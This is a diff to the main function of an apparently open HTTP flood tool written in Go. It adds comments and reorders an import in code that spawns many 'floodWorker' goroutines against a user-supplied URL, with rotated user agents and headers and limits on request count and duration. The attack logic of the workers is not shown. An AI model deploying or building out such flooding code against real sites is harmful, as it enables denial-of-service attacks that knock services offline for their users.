@@ -2,9 +2,10 @@ package main
 
 import (
 	"fmt"
-	"gopkg.in/alecthomas/kingpin.v2"
 	"log"
 	"net/url"
+
+	"gopkg.in/alecthomas/kingpin.v2"
 )
 
 //Command line args
@@ -44,7 +45,9 @@ func main() {
 		log.Fatal("URL Invalid")
 	}
 
+	// determine HTTP/HTTPS schema
 	if !((u.Scheme == "http") || (u.Scheme == "https")) {
+		// if neither, exit
 		log.Fatal(fmt.Sprintf("URL scheme (%s) unsupported", u.Scheme))
 	}
 	scheme = u.Scheme
@@ -64,27 +67,36 @@ func main() {
 	requestChan = make(chan bool)
 	workers := map[int]*floodWorker{}
 
+	// load user agents and headers
 	loadUserAgents()
 	loadHeaders()
 
 	//Start flood workers
 	for workerCounter < *maxWorkers {
+		// bind worker to object
 		workers[workerCounter] = &floodWorker{
 			exitChan: exitChan,
 			id:       workerCounter,
 		}
 
+		// if verbose flag set
 		if *verbose {
+			// return start of thread and worker #
 			fmt.Printf("Thread %d started\n", workerCounter)
 		}
 
+		// start the worker and send data stream
 		workers[workerCounter].Start()
+		// increment worker #
 		workerCounter += 1
 	}
 
 	//Misc workers
 	go Outputter()
+	// handles max # of requests
 	go MaxRequestEnforcer()
+	// handles min # of requests
 	go MaxSecondsEnforcer()
+	// handler for worker deaths
 	WorkerOverseer()
 }
